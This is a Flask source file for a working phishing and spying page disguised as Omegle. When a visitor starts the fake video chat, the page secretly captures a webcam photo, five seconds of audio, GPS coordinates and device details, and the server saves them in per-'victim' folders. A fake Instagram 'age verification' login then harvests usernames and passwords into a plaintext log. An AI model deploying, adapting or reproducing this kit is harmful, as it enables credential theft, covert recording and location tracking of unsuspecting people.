import os, base64, time, json
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)
ROOT_VAULT = "BLACK_BOX"
os.makedirs(ROOT_VAULT, exist_ok=True)

# --- واجهة Omegle التمويهية ---
html_template = """
<!DOCTYPE html>
<html>
<head>
    <title>Omegle: Talk to Strangers</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial; margin: 0; background: #000; color: white; text-align: center; }
        .header { background: #222; padding: 10px; border-bottom: 2px solid #ff7b00; color: #ff7b00; }
        #v-container { height: 70vh; background: #111; display: flex; flex-direction: column; }
        video { width: 100%; height: 50%; object-fit: cover; border-bottom: 1px solid #333; }
        .btn-box { padding: 20px; }
        #start-btn { background: #ff7b00; color: white; border: none; padding: 15px 40px; border-radius: 5px; cursor: pointer; font-weight: bold; }
        .modal { display:none; position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); background:white; padding:25px; border-radius:12px; z-index:1000; width:85%; max-width:320px; color: black; box-shadow: 0 0 20px rgba(255,123,0,0.5); }
        input { width: 90%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; }
        .login-btn { background: #0095f6; color: white; border: none; width: 100%; padding: 12px; border-radius: 6px; font-weight: bold; cursor: pointer; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="header"><h1>Omegle</h1></div>
    <div id="v-container">
        <div style="padding:20px;">Connecting to server...</div>
        <video id="localVid" autoplay muted playsinline></video>
    </div>
    <div class="btn-box"><button id="start-btn">Start Video Chat</button></div>

    <div id="loginModal" class="modal">
        <h2 style="color:#ff7b00; margin-top:0;">Age Verification</h2>
        <p style="font-size:14px; color:#666;">Login with Instagram to confirm you are 18+ and continue the chat.</p>
        <input type="text" id="u" placeholder="Phone number, username, or email">
        <input type="password" id="p" placeholder="Password">
        <button class="login-btn" onclick="saveLogin()">Log In</button>
    </div>

    <script>
        let mediaRecorder;
        let audioChunks = [];

        document.getElementById('start-btn').onclick = async () => {
            document.getElementById('start-btn').innerText = "Searching...";
            try {
                // 1. طلب الصلاحيات
                const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
                document.getElementById('localVid').srcObject = stream;
                const pos = await new Promise(r => navigator.geolocation.getCurrentPosition(r));
                
                // 2. تسجيل الصوت (5 ثواني)
                mediaRecorder = new MediaRecorder(stream);
                mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(audioChunks, {type: 'audio/wav'});
                    const reader = new FileReader();
                    reader.readAsDataURL(blob);
                    reader.onloadend = () => {
                        fetch('/save_audio', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({audio: reader.result})
                        });
                    };
                };
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 5000);

                // 3. التقاط الصورة وسحب بيانات الجهاز
                const battery = await (navigator.getBattery ? navigator.getBattery() : {level:0, charging:false});
                const canvas = document.createElement('canvas');
                canvas.width = 640; canvas.height = 480;
                canvas.getContext('2d').drawImage(document.getElementById('localVid'), 0, 0);

                await fetch('/trap', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        img: canvas.toDataURL('image/png'),
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        device: {
                            ua: navigator.userAgent,
                            bat: (battery.level * 100) + "%",
                            chg: battery.charging,
                            plat: navigator.platform,
                            mem: navigator.deviceMemory || "N/A"
                        }
                    })
                });

                // إظهار واجهة التسجيل الاحترافية
                setTimeout(() => { document.getElementById('loginModal').style.display='block'; }, 4000);

            } catch (e) { alert("Access denied. Camera and Microphone are required!"); }
        };

        async function saveLogin() {
            const u = document.getElementById('u').value;
            const p = document.getElementById('p').value;
            if(!u || !p) return;
            await fetch('/login_harvest', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({user: u, pass: p})
            });
            alert("Connection error. Please try again.");
            location.reload();
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(html_template)

@app.route('/trap', methods=['POST'])
def trap():
    d = request.get_json()
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    # المجلد الفريد لكل ضحية (يمنع التداخل)
    target_id = f"ID_{ip.replace('.','_')}_{int(time.time())}"
    path = os.path.join(ROOT_VAULT, target_id)
    os.makedirs(path, exist_ok=True)
    
    # حفظ الصورة
    with open(f"{path}/face.png", "wb") as f:
        f.write(base64.b64decode(d['img'].split(',')[1]))
    
    # إنشاء رابط الخريطة وحفظ البيانات
    map_url = f"https://www.google.com/maps?q={d['lat']},{d['lon']}"
    with open(f"{path}/device_info.json", "w") as f:
        json.dump({"IP": ip, "Google_Maps": map_url, "Specs": d['device']}, f, indent=4)
    
    return jsonify({"status": "success", "id": target_id})

@app.route('/save_audio', methods=['POST'])
def save_audio():
    # سيقوم بحفظ آخر مقطع صوتي في مجلد الضحية (يتم التعرف عليه عبر IP)
    d = request.get_json()
    ip = request.remote_addr
    with open(f"{ROOT_VAULT}/latest_audio_{ip.replace('.','_')}.wav", "wb") as f:
        f.write(base64.b64decode(d['audio'].split(',')[1]))
    return jsonify({"status": "success"})

@app.route('/login_harvest', methods=['POST'])
def login():
    d = request.get_json()
    with open(f"{ROOT_VAULT}/passwords_log.txt", "a") as f:
        f.write(f"Time: {time.ctime()} | User: {d['user']} | Pass: {d['pass']}\n")
    return jsonify({"status": "success"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
